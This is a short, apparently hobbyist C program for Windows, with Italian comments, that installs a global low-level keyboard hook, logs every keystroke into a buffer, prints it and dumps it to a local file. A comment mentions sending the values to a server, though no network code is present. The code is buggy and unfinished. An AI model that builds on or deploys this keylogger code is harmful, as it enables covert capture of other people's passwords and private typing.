#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#define BUFFERSIZE 256


/*
Thread to fflush the values to the server

*/
typedef struct{
    int n;
    int buffer[BUFFERSIZE];
} BingBongBuffer;


HHOOK hHook = NULL;
BingBongBuffer* bingbong = NULL;




int writeFileDumb(char* filename){
    FILE* fp = fopen(filename,"w+");
    if(!fp){
        printf("Errore lettura file");
        return -1;
    }
    for(int i =0;i<BUFFERSIZE;i++) fwrite(bingbong->buffer, sizeof(int), bingbong->n, fp);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        //Bing Bong will destroy your world
        bingbong->buffer[bingbong->n++] = (int)kbd->vkCode;
        if(bingbong->n == BUFFERSIZE){
            for(int i = 0;i!=BUFFERSIZE;i++){
                printf("%c\n",bingbong->buffer[i]);
            }
            writeFileDumb("test.txt");
            free(bingbong);
            UnhookWindowsHookEx(hHook);
            printf("Dovrei aver funzionanto");
            exit(-1);
        }
        //Or maybe not
        printf("Tasto premuto: %c\n", kbd->vkCode);
        if (kbd->vkCode == VK_ESCAPE) {
            PostQuitMessage(0); // Esci se viene premuto ESC
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    bingbong = (BingBongBuffer*)malloc(sizeof(BingBongBuffer));
    bingbong->n = 0;
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hHook) {
        printf("Errore nell'installazione dell'hook!\n");
        return -1;
    }

    // Loop per ricevere i messaggi
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    free(bingbong);

    // Rimuovi l'hook
    UnhookWindowsHookEx(hHook);
    return 0;
}
